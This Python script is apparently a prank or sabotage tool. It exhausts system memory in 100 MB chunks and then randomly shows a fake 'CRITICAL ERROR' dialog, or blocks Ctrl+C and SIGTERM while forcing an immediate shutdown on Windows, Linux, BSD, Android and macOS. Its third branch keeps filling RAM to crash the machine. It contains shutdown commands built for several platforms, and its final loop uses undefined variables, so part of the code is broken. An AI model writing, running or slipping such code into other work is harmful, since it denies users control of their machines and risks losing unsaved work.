import time, random, os, platform, psutil, tkinter as tk
from tkinter import messagebox
from pysigset import suspended_signals
from signal import SIGINT, SIGTERM

rand_num = random.randint(1, 3)
memory_hog = []
os_name = platform.system()
blocked_signals = False
RESERVED_GB = 2.5       # Резервное ОЗУ

root = tk.Tk()
root.withdraw()

def system_reboot_or_shutdown():
    if os_name == "Windows":
        os.system("shutdown /s /t 0")
    elif os_name == "Linux":
        os.system("sudo shutdown -P now || shutdown -P now || loginctl poweroff")
    elif os_name in ("FreeBSD", "OpenBSD", "NetBSD", "DragonFly"):
        os.system("sudo shutdown -p now || shutdown -p now")
    elif os_name == "Android":
        os.system("su -c reboot || reboot")
    elif os_name == "Darwin":
        os.system("sudo shutdown -h now")
    else:
        print(f"Unknown OS: {os_name}.")
        time.sleep(1)
        print("Attempt to execute a command based on a Unix-like system pattern...")
        time.sleep(3)
        os.system("sudo shutdown -P now || sudo reboot || reboot")


def random_event():
    global blocked_signals
    if rand_num == 1:
        messagebox.showerror("CRITICAL ERROR", "RAM OVERFLOW. Program crash!")
        os._exit(1)
    elif rand_num == 2:
        messagebox.showwarning("SYSTEM ERROR", f"RAM OVERFLOW. The operating system: {os_name} - has crashed!")
        blocked_signals = True
        with suspended_signals(SIGINT, SIGTERM):
            time.sleep(4.2)
            system_reboot_or_shutdown()
            os._exit(0)
    else:
        print("CONTINUING RAM FILLING | Filling RAM to crash...")
        blocked_signals = True                                          # Блокировка SIGINT (Ctrl+C)
        with suspended_signals(SIGINT, SIGTERM):                        # Продолжение переполения ОЗУ
            while True:
                garbage = bytes(1024 * 1024 * 100)
                memory_hog.append(garbage)
                mem = psutil.virtual_memory()
                print(f"Added: +{added_mb}MB | Total allocated: {total_used_gb:.1f}GB | RAM used: {mem.percent:.0f}%", end='\r')
                time.sleep(0.01)
        

def main():
    total_used_gb = 0
    try:
        while True:
            mem = psutil.virtual_memory()
            available_bytes = mem.available
                
            added_mb = 100
            total_used_gb += added_mb / 1024
            print(f"Added: +{added_mb}MB | Total allocated: {total_used_gb:.1f}GB | RAM used: {mem.percent:.0f}%", end='\r')
                
            if available_bytes < RESERVED_GB * 1024**3:
                print(f"\nTRIGGER! rand_num={rand_num}")
                random_event()
                
            garbage = bytes(1024 * 1024 * 100)
            memory_hog.append(garbage)
    except KeyboardInterrupt:
        print("\n...exiting programs -> |.|")

if __name__ == "__main__":
    main()